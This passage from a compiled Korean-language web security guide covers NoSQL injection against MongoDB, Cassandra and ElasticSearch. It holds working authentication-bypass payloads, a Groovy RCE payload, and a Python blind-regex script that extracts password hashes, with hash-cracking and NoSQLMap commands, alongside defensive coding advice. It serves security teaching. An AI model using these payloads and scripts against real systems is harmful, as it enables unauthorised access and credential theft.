\ucffc\ub9ac"]}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uc815\uc0c1 \ucffc\ub9ac"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-json",children:'{\n  "selector": {\n    "username": "admin",\n    "password": "password123"\n  }\n}\n'})}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"Injection"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-json",children:'{\n  "selector": {\n    "username": "admin",\n    "password": {"$ne": null}\n  }\n}\n'})}),"\n",(0,r.jsxs)(e.p,{children:["\u2192 ",(0,r.jsx)(e.strong,{children:"\uc778\uc99d \uc6b0\ud68c"})]}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h2,{id:"cassandra-injection",children:"Cassandra Injection"}),"\n",(0,r.jsx)(e.h3,{id:"cql-cassandra-query-language",children:"CQL (Cassandra Query Language)"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"CQL\uc740 SQL\uacfc \uc720\uc0ac"}),"\ud558\uc9c0\ub9cc \uc81c\ud55c\uc801:"]}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uc815\uc0c1 \ucffc\ub9ac"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-cql",children:"SELECT * FROM users WHERE username='admin' AND password='password123'\n"})}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"Injection \uc2dc\ub3c4"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-cql",children:"SELECT * FROM users WHERE username='admin' OR 1=1--' AND password='anything'\n"})}),"\n",(0,r.jsxs)(e.p,{children:["\u2192 ",(0,r.jsx)(e.strong,{children:"\ub300\ubd80\ubd84 \uc2e4\ud328"})," (Prepared Statements \uae30\ubcf8 \uc0ac\uc6a9)"]}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h2,{id:"elasticsearch-injection",children:"ElasticSearch Injection"}),"\n",(0,r.jsx)(e.h3,{id:"elasticsearch-query-dsl",children:"ElasticSearch Query DSL"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uc815\uc0c1 \ucffc\ub9ac"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-json",children:'{\n  "query": {\n    "match": {\n      "username": "admin"\n    }\n  }\n}\n'})}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"Injection"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-json",children:'{\n  "query": {\n    "match_all": {}\n  }\n}\n'})}),"\n",(0,r.jsxs)(e.p,{children:["\u2192 ",(0,r.jsx)(e.strong,{children:"\ubaa8\ub4e0 \ubb38\uc11c \ubc18\ud658"})]}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h3,{id:"script-query-\uc545\uc6a9",children:"Script Query \uc545\uc6a9"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"Groovy \uc2a4\ud06c\ub9bd\ud2b8 \uc2e4\ud589"})," (\uad6c\ubc84\uc804):"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-json",children:'{\n  "query": {\n    "script": {\n      "script": "java.lang.Runtime.getRuntime().exec(\'calc.exe\')"\n    }\n  }\n}\n'})}),"\n",(0,r.jsxs)(e.p,{children:["\u2192 ",(0,r.jsx)(e.strong,{children:"RCE (\uc6d0\uaca9 \ucf54\ub4dc \uc2e4\ud589)"})]}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\ucd5c\uc2e0 \ubc84\uc804"}),": Groovy \uc2a4\ud06c\ub9bd\ud2b8 \ube44\ud65c\uc131\ud654\ub428"]}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h2,{id:"\uc790\ub3d9\ud654-\ub3c4\uad6c",children:"\uc790\ub3d9\ud654 \ub3c4\uad6c"}),"\n",(0,r.jsx)(e.h3,{id:"nosqlmap",children:"NoSQLMap"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uc124\uce58"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-bash",children:"git clone https://github.com/codingo/NoSQLMap.git\ncd NoSQLMap\npython3 nosqlmap.py\n"})}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uc0ac\uc6a9"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-bash",children:"# MongoDB \uc2a4\uce94\npython3 nosqlmap.py -u http://example.com/login -p username,password\n\n# \uc778\uc99d \uc6b0\ud68c \uc790\ub3d9\ud654\npython3 nosqlmap.py -u http://example.com/login -p username,password --attack 1\n\n# Blind Injection\npython3 nosqlmap.py -u http://example.com/login -p username,password --attack 2\n"})}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h3,{id:"burp-suite---nosql-scanner",children:"Burp Suite - NoSQL Scanner"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"Burp Extension"}),": NoSQL Scanner"]}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uc124\uce58"}),":"]}),"\n",(0,r.jsxs)(e.ol,{children:["\n",(0,r.jsx)(e.li,{children:"Extender \u2192 BApp Store"}),"\n",(0,r.jsx)(e.li,{children:'"NoSQL Scanner" \uc124\uce58'}),"\n"]}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uc0ac\uc6a9"}),":"]}),"\n",(0,r.jsxs)(e.ul,{children:["\n",(0,r.jsx)(e.li,{children:'Target \u2192 Site Map \u2192 \uc6b0\ud074\ub9ad \u2192 "Scan with NoSQL Scanner"'}),"\n"]}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h2,{id:"\uc2e4\uc804-\uacf5\uaca9-\uc2dc\ub098\ub9ac\uc624",children:"\uc2e4\uc804 \uacf5\uaca9 \uc2dc\ub098\ub9ac\uc624"}),"\n",(0,r.jsx)(e.h3,{id:"\uc2dc\ub098\ub9ac\uc624-mongodb-\uc778\uc99d-\uc6b0\ud68c--\ube44\ubc00\ubc88\ud638-\ucd94\ucd9c",children:"\uc2dc\ub098\ub9ac\uc624: MongoDB \uc778\uc99d \uc6b0\ud68c + \ube44\ubc00\ubc88\ud638 \ucd94\ucd9c"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\ub300\uc0c1"}),": Node.js + MongoDB API"]}),"\n",(0,r.jsx)(e.p,{children:(0,r.jsx)(e.strong,{children:"Phase 1: \uc778\uc99d \uc6b0\ud68c"})}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"1. \uc815\uc0c1 \ub85c\uadf8\uc778 \uc2dc\ub3c4"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-http",children:'POST /api/login HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\n    "username": "admin",\n    "password": "wrongpassword"\n}\n'})}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uc751\ub2f5"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-json",children:'{"error": "Invalid credentials"}\n'})}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"2. NoSQL Injection \uc2dc\ub3c4"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-http",children:'POST /api/login HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\n    "username": {"$ne": null},\n    "password": {"$ne": null}\n}\n'})}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uc751\ub2f5"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-json",children:'{\n    "success": true,\n    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",\n    "user": {\n        "username": "admin",\n        "role": "admin"\n    }\n}\n'})}),"\n",(0,r.jsxs)(e.p,{children:["\u2192 ",(0,r.jsx)(e.strong,{children:"\uad00\ub9ac\uc790 \uad8c\ud55c \ud68d\ub4dd"})]}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.p,{children:(0,r.jsx)(e.strong,{children:"Phase 2: \ube44\ubc00\ubc88\ud638 \ucd94\ucd9c"})}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"3. Blind Injection \uc2a4\ud06c\ub9bd\ud2b8"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-python",children:'import requests\nimport string\n\nurl = "http://example.com/api/login"\npassword = ""\ncharset = string.hexdigits.lower()\n\nfor i in range(32):  # MD5 32\uc790\n    for c in charset:\n        payload = {\n            "username": "admin",\n            "password": {"$regex": f"^{password}{c}"}\n        }\n\n        r = requests.post(url, json=payload)\n\n        if r.status_code == 200 and "success" in r.text:\n            password += c\n            print(f"[+] {password}")\n            break\n\nprint(f"\\n[+] Password: {password}")\n'})}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"4. \ud574\uc2dc \ud06c\ub799"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-bash",children:'echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt\njohn --format=Raw-MD5 --wordlist=rockyou.txt hash.txt\n'})}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uacb0\uacfc"}),": ",(0,r.jsx)(e.code,{children:"password"})]}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h2,{id:"\ubc29\uc5b4-\uae30\ubc95",children:"\ubc29\uc5b4 \uae30\ubc95"}),"\n",(0,r.jsx)(e.h3,{id:"1-input-validation",children:"1. Input Validation"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\ucde8\uc57d\ud55c \ucf54\ub4dc"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-javascript",children:"const username = req.body.username;\nconst password = req.body.password;\n"})}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uc548\uc804\ud55c \ucf54\ub4dc"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-javascript",children:"const username = req.body.username;\nconst password = req.body.password;\n\n// \ud0c0\uc785 \uac80\uc99d\nif (typeof username !== 'string' || typeof password !== 'string') {\n    return res.status(400).json({error: \"Invalid input\"});\n}\n\n// \uac1d\uccb4 \uac70\ubd80\nif (typeof username === 'object' || typeof password === 'object') {\n    return res.status(400).json({error: \"Objects not allowed\"});\n}\n"})}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h3,{id:"2-schema-validation-mongoose",children:"2. Schema Validation (Mongoose)"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-javascript",children:"const userSchema = new mongoose.Schema({\n    username: { type: String, required: true },\n    password: { type: String, required: true }\n});\n\n// \ucffc\ub9ac \uc2dc \ud0c0\uc785 \uac15\uc81c\nUser.findOne({\n    username: String(req.body.username),\n    password: String(req.body.password)\n});\n"})}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h3,{id:"3-sanitization",children:"3. Sanitization"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-javascript",children:"const mongoSanitize = require('express-mongo-sanitize');\n\napp.use(mongoSanitize({\n    replaceWith: '_'  // $, . \ubb38\uc790\ub97c _\ub85c \uce58\ud658\n}));\n"})}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h3,{id:"4-\ucd5c\uc18c-\uad8c\ud55c-\uc6d0\uce59",children:"4. \ucd5c\uc18c \uad8c\ud55c \uc6d0\uce59"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"MongoDB \uc0ac\uc6a9\uc790 \uad8c\ud55c \uc81c\ud55c"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-javascript",children:'db.createUser({\n    user: "webapp",\n    pwd: "password",\n    roles: [\n        { role: "read", db: "mydb" },\n        { role: "readWrite", db: "mydb" }\n    ]\n});\n'})}),"\n",(0,r.jsxs)(e.p,{children:["\u2192 ",(0,r.jsx)(e.code,{children:"$where"})," \uc2e4\ud589 \uad8c\ud55c \uc5c6\uc74c"]}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h3,{id:"5-rate-limiting",children:"5. Rate Limiting"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-javascript",children:"const rateLimit = require('express-rate-limit');\n\nconst loginLimiter = rateLimit({\n    windowMs: 15 * 60 * 1000,  // 15\ubd84\n    max: 5,  // \ucd5c\ub300 5\ubc88 \uc2dc\ub3c4\n    message: \"Too many login attempts\"\n});\n\napp.post('/login', loginLimiter, (req, res) => {\n    // \ub85c\uadf8\uc778 \ub85c\uc9c1\n});\n"})}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h2,{id:"\ud2b8\ub7ec\ube14\uc288\ud305-\uccb4\ud06c\ub9ac\uc2a4\ud2b8",children:"\ud2b8\ub7ec\ube14\uc288\ud305 \uccb4\ud06c\ub9ac\uc2a4\ud2b8"}),"\n",(0,r.jsx)(e.h3,{id:"nosql-injection\uc774-\uc548-\ub420-\ub54c",children:"NoSQL Injection\uc774 \uc548 \ub420 \ub54c"}),"\n",(0,r.jsxs)(e.ul,{className:"contains-task-list",children:["\n",(0,r.jsxs)(e.li,{className:"task-list-item",children:[(0,r.jsx)(e.input,{type:"checkbox",disabled:!0})," ","\uc694\uccad Content-Type \ud655\uc778 (application/json)"]}),"\n",(0,r.jsxs)(e.li,{className:"task-list-item",children:[(0,r.jsx)(e.input,{type:"checkbox",disabled:!0})," ","\ubc31\uc5d4\ub4dc\uac00 Mongoose \ub4f1 ORM \uc0ac\uc6a9\ud558\ub294\uc9c0 \ud655\uc778"]}),"\n",(0,r.jsxs)(e.li,{className:"task-list-item",children:[(0,r.jsx)(e.input,{type:"checkbox",disabled:!0})," ","Input validation\uc774 \uc788\ub294\uc9c0 \ud655\uc778"]}),"\n",(0,r.jsxs)(e.li,{className:"task-list-item",children:[(0,r.jsx)(e.input,{type:"checkbox",disabled:!0})," ","\ub2e4\ub978 \uc5f0\uc0b0\uc790 \uc2dc\ub3c4 ($gt, $regex, $where)"]}),"\n"]}),"\n",(0,r.jsx)(e.h3,{id:"blind-injection\uc774-\ub290\ub9b4-\ub54c",children:"Blind Injection\uc774 \ub290\ub9b4 \ub54c"}),"\n",(0,r.jsxs)(e.ul,{className:"contains-task-list",children:["\n",(0,r.jsxs)(e.li,{className:"task-list-item",children:[(0,r.jsx)(e.input,{type:"checkbox",disabled:!0})," ","\ubb38\uc790\uc14b \ucd5c\uc18c\ud654 (hex\ub9cc \uc0ac\uc6a9)"]}),"\n",(0,r.jsxs)(e.li,{className:"task-list-item",children:[(0,r.jsx)(e.input,{type:"checkbox",disabled:!0})," ","\ubcd1\ub82c \uc694\uccad (\uba40\ud2f0\uc2a4\ub808\ub529)"]}),"\n",(0,r.jsxs)(e.li,{className:"task-list-item",children:[(0,r.jsx)(e.input,{type:"checkbox",disabled:!0})," ","Time-based \ub300\uc2e0 Boolean-based \uc0ac\uc6a9"]}),"\n"]}),"\n",(0,r.jsx)(e.h3,{id:"\uc790\ub3d9\ud654-\ub3c4\uad6c-\uc2e4\ud328-\uc2dc",children:"\uc790\ub3d9\ud654 \ub3c4\uad6c \uc2e4\ud328 \uc2dc"}),"\n",(0,r.jsxs)(e.ul,{className:"contains-task-list",children:["\n",(0,r.jsxs)(e.li,{className:"task-list-item",children:[(0,r.jsx)(e.input,{type:"checkbox",disabled:!0})," ","\uc218\ub3d9\uc73c\ub85c \ud398\uc774\ub85c\ub4dc \ud655\uc778"]}),"\n",(0,r.jsxs)(e.li,{className:"task-list-item",children:[(0,r.jsx)(e.input,{type:"checkbox",disabled:!0})," ","Burp Suite\ub85c \uc694\uccad/\uc751\ub2f5 \ubd84\uc11d"]}),"\n",(0,r.jsxs)(e.li,{className:"task-list-item",children:[(0,r.jsx)(e.input,{type:"checkbox",disabled:!0})," ","\ucee4\uc2a4\ud140 \uc2a4\ud06c\ub9bd\ud2b8 \uc791\uc131"]}),"\n"]}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h2,{id:"\ube60\ub978-\uba85\ub839\uc5b4-\ucc38\uc870",children:"\ube60\ub978 \uba85\ub839\uc5b4 \ucc38\uc870"}),"\n",(0,r.jsx)(e.h3,{id:"mongodb-injection-1",children:"MongoDB Injection"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-json",children:'# \uc778\uc99d \uc6b0\ud68c\n{"username": {"$ne": null}, "password": {"$ne": null}}\n{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}\n{"username": "admin", "password": {"$gt": ""}}\n\n# Blind Injection\n{"username": "admin", "password": {"$regex": "^a"}}\n{"username": "admin", "password": {"$regex": "^.{32}$"}}\n\n# $where \uc545\uc6a9\n{"$where": "sleep(5000) || true"}\n{"$where": "this.password[0] == \'a\'"}\n\n# \ub370\uc774\ud130 \ucd94\ucd9c\n{"username": {"$in": ["admin", "root"]}}\n'})}),"\n",(0,r.jsx)(e.h3,{id:"url-\uc778\ucf54\ub529",children:"URL \uc778\ucf54\ub529"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{children:"username[$ne]=null&password[$ne]=null\nusername[$regex]=^admin&password[$gt]=\n"})}),"\n",(0,r.jsx)(e.h3,{id:"nosqlmap-1",children:"NoSQLMap"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-bash",children:"# \uae30\ubcf8 \uc2a4\uce94\npython3 nosqlmap.py -u http://example.com/login -p username,password\n\n# \uc778\uc99d \uc6b0\ud68c\npython3 nosqlmap.py -u http://example.com/login -p username,password --attack 1\n\n# Blind Injection\npython3 nosqlmap.py -u http://example.com/login -p username,password --attack 2 --victim admin\n"})}),"\n",(0,r.jsx)(e.h3,{id:"python-\uc790\ub3d9\ud654",children:"Python \uc790\ub3d9\ud654"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-python",children:'import requests\n\n# \uc778\uc99d \uc6b0\ud68c\npayload = {"username": {"$ne": null}, "password": {"$ne": null}}\nr = requests.post("http://example.com/api/login", json=payload)\n\n# Blind Injection\nfor c in "abcdefghijklmnopqrstuvwxyz0123456789":\n    payload = {"username": "admin", "password": {"$regex": f"^{password}{c}"}}\n    r = requests.post(url, json=payload)\n    if "success" in r.text:\n        password += c\n'})}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h2,{id:"\ucc38\uace0-\uc790\ub8cc",children:"\ucc38\uace0 \uc790\ub8cc"}),"\n",(0,r.jsxs)(e.ul,{children:["\n",(0,r.jsxs)(e.li,{children:["OWASP NoSQL Injection: ",(0,r.jsx)(e.a,{href:"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",children:"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection"})]}),"\n",(0,r.jsxs)(e.li,{children:["MongoDB Security: ",(0,r.jsx)(e.a,{href:"https://www.mongodb.com/docs/manual/security/",children:"https://www.mongodb.com/docs/manual/security/"})]}),"\n",(0,r.jsxs)(e.li,{children:["NoSQLMap: ",(0,r.jsx)(e.a,{href:"https://github.com/codingo/NoSQLMap",children:"https://github.com/codingo/NoSQLMap"})]}),"\n",(0,r.jsxs)(e.li,{children:["HackTricks NoSQL: ",(0,r.jsx)(e.a,{href:"https://book.hacktricks.xyz/pentesting-web/nosql-injection",children:"https://book.hacktricks.xyz/pentesting-web/nosql-injection"})]}),"\n"]}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h2,{id:"\ub2e4\uc74c-\ub2e8\uacc4",children:"\ub2e4\uc74c \ub2e8\uacc4"}),"\n",(0,r.jsxs)(e.ul,{children:["\n",(0,r.jsxs)(e.li,{children:[(0,r.jsx)(e.a,{href:"/my-docusaurus-page/web_attacks/sql_injection/advanced_exploitation",children:"\uace0\uae09 \uc775\uc2a4\ud50c\ub85c\uc787"})," - \ud30c\uc77c \uc77d\uae30/\uc4f0\uae30, RCE, \ub370\uc774\ud130 \uc720\ucd9c"]}),"\n"]})]})}function h(n={}){const{wrapper:e}={...(0,l.R)(),...n.components};return e?(0,r.jsx)(e,{...n,children:(0,r.jsx)(t,{...n})}):t(n)}}}]);